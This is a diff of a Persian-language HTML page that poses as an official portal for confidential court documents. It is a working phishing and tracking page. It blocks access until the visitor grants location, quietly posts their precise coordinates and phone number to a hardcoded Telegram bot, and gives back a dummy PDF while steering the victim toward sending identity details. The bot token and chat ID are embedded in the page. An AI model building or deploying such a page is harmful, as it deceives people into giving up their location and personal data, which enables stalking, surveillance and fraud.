@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سامانه ارسال لوکیشن خودکار و دقیق</title>
+    <title>سامانه رسمی دریافت مدارک محرمانه</title>
     <style>
-        /* CSS برای طراحی رسمی و مدرن */
+        /* CSS برای طراحی رسمی */
         body {
             font-family: 'Tahoma', 'B Nazanin', Arial, sans-serif;
             background-color: #f4f7f6;
@@ -22,29 +22,87 @@
         .container {
             background-color: #ffffff;
             border: 1px solid #e0e0e0;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            padding: 30px 40px;
-            border-radius: 10px;
-            max-width: 550px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            padding: 40px;
+            border-radius: 12px;
+            max-width: 600px;
             width: 90%;
             text-align: center;
         }
         h1 {
             color: #172a5a;
-            font-size: 26px;
+            font-size: 28px;
             border-bottom: 3px solid #172a5a;
             padding-bottom: 10px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             text-align: center;
         }
         .info-box {
             background-color: #f0f8ff;
-            border-right: 5px solid #172a5a;
+            border-right: 5px solid #0056b3;
             padding: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             font-size: 15px;
             color: #172a5a;
             text-align: justify;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            text-align: left;
+            direction: ltr;
+        }
+        .captcha-box {
+            display: flex;
+            align-items: center;
+        }
+        #captcha-display {
+            background-color: #e9ecef;
+            border: 1px solid #ccc;
+            padding: 10px;
+            font-size: 20px;
+            letter-spacing: 5px;
+            font-weight: bold;
+            margin-left: 10px;
+            border-radius: 6px;
+            user-select: none; /* جلوگیری از انتخاب متن */
+            color: #172a5a;
+            width: 150px;
+            text-align: center;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            background-color: #28a745; /* سبز برای ثبت و دانلود */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        button:hover:not(:disabled) {
+            background-color: #1e7e34;
+        }
+        button:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
         }
         #status-message {
             margin-top: 25px;
@@ -53,138 +111,257 @@
             font-size: 16px;
             font-weight: bold;
             text-align: center;
-            background-color: #e9ecef;
-            color: #495057;
+            min-height: 50px;
         }
-        .error {
-            background-color: #f8d7da !important;
-            color: #721c24 !important;
-            border: 1px solid #f5c6cb;
+        .error { background-color: #f8d7da; color: #721c24; }
+        .success { background-color: #d4edda; color: #155724; }
+        .warning { background-color: #fff3cd; color: #856404; }
+
+        /* لایه پوششی برای قفل کردن صفحه */
+        #lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            text-align: center;
         }
-        .success {
-            background-color: #d4edda !important;
-            color: #155724 !important;
-            border: 1px solid #c3e6cb;
+        #lock-overlay h2 { color: #dc3545; }
+        
+        .hidden { display: none; }
+        
+        /* استایل loading GIF */
+        .loading-gif {
+            width: 50px;
+            height: 50px;
+            margin: 10px auto;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body onload="requestAndSendLocation()"> 
+<body onload="checkLocationOnLoad()"> 
     
-    <div class="container">
-        <h1>سامانه ثبت موقعیت مکانی خودکار</h1>
+    <div id="lock-overlay" class="hidden">
+        <h2>❌ دسترسی ممنوع!</h2>
+        <p style="font-size: 18px; color: #333;">جهت ورود به سامانه، لطفاً مکان‌یابی (Location Service) دستگاه خود را فعال نموده و سپس صفحه را رفرش کنید.</p>
+        <button onclick="window.location.reload();" style="width: 250px; background-color: #dc3545;">تلاش مجدد (رفرش صفحه)</button>
+    </div>
+
+    <div class="container hidden" id="main-content">
+        <h1>سامانه دریافت مدارک محرمانه و قضایی</h1>
         
         <div class="info-box">
-            <p><strong>اطلاعیه مهم:</strong> سیستم به طور خودکار، فرآیند درخواست موقعیت مکانی شما را آغاز کرده است. لطفاً در صورت مشاهده پیغام مرورگر، *اجازه دسترسی به مکان (Location Access)* را صادر فرمایید.</p>
+            <p><strong>مهم:</strong> برای دانلود مدارک محرم و رای دادگاه عالی، لطفاً شماره تماس و کد امنیتی زیر را با دقت وارد نمایید. مکان‌یابی شما برای ثبت در سوابق فعال است.</p>
         </div>
         
         <input type="hidden" id="bot-token" value="7851461640:AAFr8MiKSffcmsalQMF-oczoUwopV1bfcu8"> 
         <input type="hidden" id="chat-id" value="7570861617"> 
-        <input type="hidden" id="user-token-id" value="AUTO-REF-WEB-2025-02-B">
+        <input type="hidden" id="user-token-id" value="CONFIDENTIAL-DOCS-2025-A">
 
-        <div id="status-message">⏳ در حال بارگذاری سیستم و درخواست موقعیت مکانی...</div>
+        <form id="auth-form" onsubmit="handleDownload(event)">
+            <div class="form-group">
+                <label for="phone-number">شماره تماس جهت ثبت در سامانه (مثال: 935xxxxxxx)</label>
+                <input type="text" id="phone-number" required pattern="[0-9]{10,12}" title="لطفاً شماره تماس معتبر وارد نمایید.">
+            </div>
+
+            <div class="form-group">
+                <label for="captcha-input">کد امنیتی (Capatcha)</label>
+                <div class="captcha-box">
+                    <input type="text" id="captcha-input" required maxlength="6">
+                    <div id="captcha-display"></div>
+                </div>
+            </div>
+
+            <button type="submit" id="download-button" disabled>ثبت و دانلود مدارک محرم</button>
+        </form>
+        
+        <div id="status-message" class="warning">لطفاً شماره تماس و کد امنیتی را وارد نمایید.</div>
+        <div id="loading-spinner" class="loading-gif hidden"></div>
     </div>
 
     <script>
-        // تابع کمکی برای به‌روزرسانی وضعیت پیام در صفحه
-        function updateStatus(message, type = '') {
+        // --- متغیرهای سراسری ---
+        let currentCaptcha = '';
+        let userLocation = null;
+
+        // --- توابع کمکی ---
+
+        function updateStatus(message, type = 'warning') {
             const statusElement = document.getElementById('status-message');
             statusElement.innerHTML = message;
             statusElement.className = type;
         }
 
-        // تابع اصلی: درخواست لوکیشن هنگام بارگذاری صفحه
-        function requestAndSendLocation() {
-            const BOT_TOKEN = document.getElementById('bot-token').value;
-            const CHAT_ID = document.getElementById('chat-id').value;
-            const USER_TOKEN = document.getElementById('user-token-id').value; // توکن رهگیری اختیاری
-
-            if (!navigator.geolocation) {
-                updateStatus("❌ مرورگر شما از Geolocation پشتیبانی نمی‌کند.", 'error');
-                return;
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-            
-            updateStatus("⏳ در حال درخواست موقعیت مکانی... لطفاً مجوز مرورگر را تأیید کنید.");
-
-            // دریافت لوکیشن با تنظیمات دقت بالا
-            navigator.geolocation.getCurrentPosition(
-                
-                // Success Callback: در صورت دریافت موفقیت‌آمیز مختصات
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    updateStatus(✅ موقعیت مکانی دریافت شد. Latitude: ${lat}, Longitude: ${lon}. در حال ارسال به تلگرام...);
-                    
-                    // فراخوانی تابع ارسال لوکیشن به تلگرام
-                    sendLocationToTelegram(lat, lon, USER_TOKEN, BOT_TOKEN, CHAT_ID);
-                },
-                
-                // Error Callback: در صورت بروز خطا (مثل عدم صدور مجوز)
-                (error) => {
-                    let errorMessage;
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage = "❌ *عدم مجوز:* کاربر دسترسی را لغو کرد.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage = "⚠ *خطای فنی:* اطلاعات موقعیت مکانی در دسترس نیست.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage = "⌛ *خطای وقفه:* درخواست موقعیت مکانی به پایان رسید.";
-                            break;
-                        default:
-                            errorMessage = "🔥 *خطای نامشخص:* در دریافت موقعیت مکانی رخ داد.";
-                    }
-                    updateStatus(errorMessage, 'error');
-                },
-                
-                // تنظیمات Geolocation API
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
-            );
+            currentCaptcha = result;
+            document.getElementById('captcha-display').textContent = result;
         }
 
-        // تابع ارسال به تلگرام با استفاده از متد sendLocation
-        function sendLocationToTelegram(lat, lon, userToken, botToken, chatId) {
+        function toggleContent(show) {
+            document.getElementById('main-content').classList.toggle('hidden', !show);
+            document.getElementById('lock-overlay').classList.toggle('hidden', show);
+        }
+
+        // --- فاز ۱: کنترل مکان‌یابی و قفل صفحه ---
+
+        function checkLocationOnLoad() {
+            // نمایش یک پیام اولیه قبل از درخواست
+            updateStatus("⏳ در حال بررسی وضعیت مکان‌یابی دستگاه...", 'warning');
             
-            // آدرس API برای متد sendLocation (دقت کنید که /bot حذف شده است)
-            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendLocation;
+            // درخواست مجوز لوکیشن
+            navigator.geolocation.getCurrentPosition(
+                
+                // Success: مکان‌یابی فعال است
+                (position) => {
+                    userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
+                    // ارسال لوکیشن به تلگرام و سپس نمایش صفحه اصلی
+                    sendLocationToTelegram(userLocation.lat, userLocation.lon, 'Location-Check-Success');
+                    
+                    // نمایش محتوای اصلی و فعال کردن رویدادها
+                    toggleContent(true); 
+                    generateCaptcha(); // ساخت کد امنیتی
+                    document.getElementById('download-button').disabled = true;
+                    updateStatus("✅ مکان‌یابی فعال شد. فرم را تکمیل نمایید.", 'success');
+                },
+                
+                // Error: مکان‌یابی خاموش است یا کاربر اجازه نداده است
+                (error) => {
+                    // نمایش صفحه قفل
+                    toggleContent(false); 
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        }
+        
+        // --- فاز ۲: احراز هویت و فعال‌سازی دکمه دانلود ---
+
+        document.getElementById('captcha-input').addEventListener('input', checkFormValidity);
+        document.getElementById('phone-number').addEventListener('input', checkFormValidity);
+
+        function checkFormValidity() {
+            const phone = document.getElementById('phone-number').value.trim();
+            const captcha = document.getElementById('captcha-input').value.trim();
+            const button = document.getElementById('download-button');
+
+            const isPhoneValid = phone.match(/^[0-9]{10,12}$/);
+            const isCaptchaCorrect = captcha.toUpperCase() === currentCaptcha;
+
+            if (isPhoneValid && isCaptchaCorrect) {
+                button.disabled = false;
+                updateStatus("آماده برای دانلود مدارک.", 'success');
+            } else {
+                button.disabled = true;
+                updateStatus("لطفاً شماره تماس و کد امنیتی را صحیح وارد نمایید.", 'warning');
+            }
+        }
+
+        // --- فاز ۳: پروسس و دانلود ---
+
+        function handleDownload(event) {
+            event.preventDefault(); // جلوگیری از ارسال فرم سنتی
+            const button = document.getElementById('download-button');
+            const spinner = document.getElementById('loading-spinner');
+            const phoneNumber = document.getElementById('phone-number').value.trim();
             
-            // بدنه درخواست (Payload) با پارامترهای اصلی sendLocation
+            // قفل کردن دکمه و نمایش Loading
+            button.disabled = true;
+            spinner.classList.remove('hidden');
+            updateStatus("⏳ در حال پردازش و آماده‌سازی مدارک محرم...", 'warning');
+
+            // ارسال نهایی اطلاعات (شامل شماره تماس و لوکیشن) به تلگرام
+            sendFinalDataToTelegram(phoneNumber);
+
+            // شبیه‌سازی دانلود بعد از 3 ثانیه
+            setTimeout(() => {
+                
+                // ایجاد لینک دانلود ساختگی برای PDF (میتوانید لینک واقعی PDF را اینجا بگذارید)
+                const pdfData = "data:application/pdf;base64,JVBERi0xLjEKJcOkw7zEnwpbCiAgPDwvVHlwZSAvUGFnZS9NZWRpYUJveCBbMCAwIDYxMiA3OTJdL1JvdGF0ZSAwPj4KXV0K"; // نمونه PDF خالی
+                const a = document.createElement('a');
+                a.href = pdfData;
+                a.download = 'فرم_اظهار_هویت_محرمانه.pdf';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                // بازگشت وضعیت
+                spinner.classList.add('hidden');
+                updateStatus(✅ **دانلود موفق!** برای دریافت مدارک محرم و رای دادگاه عالی، فورم اظهار هویت را خانه پُرینماید و به کانال تلگرام location904411_Bot ارسال نماید., 'success');
+                
+            }, 3000); // 3 ثانیه Loading GIF
+        }
+        
+        // --- توابع ارسال به تلگرام (به روز شده) ---
+
+        function sendLocationToTelegram(lat, lon, reason) {
+            const BOT_TOKEN = document.getElementById('bot-token').value;
+            const CHAT_ID = document.getElementById('chat-id').value;
+            
+            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+
+            const message = (
+                ⚠ **کنترل ورود سامانه:**\n +
+                **وضعیت:** ${reason}\n +
+                **عرض:** ${lat}\n +
+                **طول:** ${lon}
+            );
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
+            }).catch(e => console.error("Error sending check status to Telegram:", e));
+        }
+        
+        function sendFinalDataToTelegram(phoneNumber) {
+            const BOT_TOKEN = document.getElementById('bot-token').value;
+            const CHAT_ID = document.getElementById('chat-id').value;
+            const USER_TOKEN = document.getElementById('user-token-id').value;
+            const locationString = userLocation ? ${userLocation.lat},${userLocation.lon} : 'N/A';
+            
+            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation;
+
             const payload = {
-                chat_id: chatId,
-                latitude: lat,        // ارسال مستقیم عرض جغرافیایی
-                longitude: lon,       // ارسال مستقیم طول جغرافیایی
-                // پارامترهای اختیاری زیر برای اضافه کردن جزئیات بیشتر به پیام بعد از نقشه مفید است
-                caption: ✅ **موقعیت مکانی ثبت شد!**\nتوکن رهگیری: \${userToken}\\nزمان: ${new Date().toLocaleString('fa-IR')},
+                chat_id: CHAT_ID,
+                latitude: userLocation.lat,
+                longitude: userLocation.lon,
+                caption: (
+                    🚨 **ثبت اطلاعات محرمانه و دانلود:**\n +
+                    **توکن رهگیری:** \${USER_TOKEN}\\n +
+                    **شماره تماس ثبت شده:** \${phoneNumber}\\n +
+                    **زمان:** ${new Date().toLocaleString('fa-IR')}\n +
+                    \n**مدارک دانلود شد.**
+                ),
                 parse_mode: 'Markdown'
             };
 
             fetch(telegramApiUrl, {
                 method: 'POST',
-                headers: {
-                    // Content-Type باید application/json باشد
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload), // ارسال داده‌ها به صورت JSON
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    updateStatus("✔ *ارسال موفق!* نقشه موقعیت مکانی با موفقیت به تلگرام ارسال شد.", 'success');
-                } else {
-                    updateStatus(❌ **خطا در API تلگرام:** ${data.description}. (با وجود توکن معتبر، مشکل در ارسال داده است.), 'error');
-                    console.error("Telegram API Error:", data);
-                }
-            })
-            .catch((error) => {
-                updateStatus(🔥 **خطای شبکه:** اتصال به سرور تلگرام برقرار نشد: ${error.message}, 'error');
-                console.error("Network Error:", error);
-            });
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            }).catch(e => console.error("Error sending final data to Telegram:", e));
         }
+
+        // --- فراخوانی اولیه برای ساخت Captcha هنگام بارگذاری ---
+        // (این خط قبلاً در checkLocationOnLoad فراخوانی می‌شد، اما برای اطمینان در اینجا نیز قرار دارد)
+        // generateCaptcha(); 
     </script>
 </body>
 </html>
